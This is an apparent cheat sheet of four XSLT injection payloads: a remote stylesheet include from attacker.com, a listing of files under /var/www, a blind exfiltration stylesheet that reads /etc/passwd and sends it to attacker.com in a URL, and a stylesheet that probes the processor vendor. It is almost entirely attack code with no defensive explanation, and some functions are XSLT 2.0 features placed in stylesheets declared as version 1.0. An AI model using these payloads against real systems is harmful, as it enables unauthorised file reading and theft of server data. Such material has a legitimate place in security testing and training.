1- Remote File Inclusion
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:include href="http://attacker.com/malicious.xsl"/>
  <xsl:template match="/">
    <!-- Content here -->
  </xsl:template>
</xsl:stylesheet>
```

2- File System Access
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:for-each select="collection('file:///var/www/')">
      <xsl:value-of select="document-uri(.)"/><br/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
```

3- BlindXSLT Injection (Data Exfiltration)
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:variable name="secret" select="document('/etc/passwd')"/>
    <xsl:value-of select="document(concat('http://attacker.com/?data=', encode-for-uri($secret)))"/>
  </xsl:template>
</xsl:stylesheet>
```

4- Recursive Processing
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:variable name="eval">
      <root>
        <xsl:value-of select="system-property('xsl:vendor')"/>
      </root>
    </xsl:variable>
    <xsl:apply-templates select="$eval"/>
  </xsl:template>
</xsl:stylesheet>
```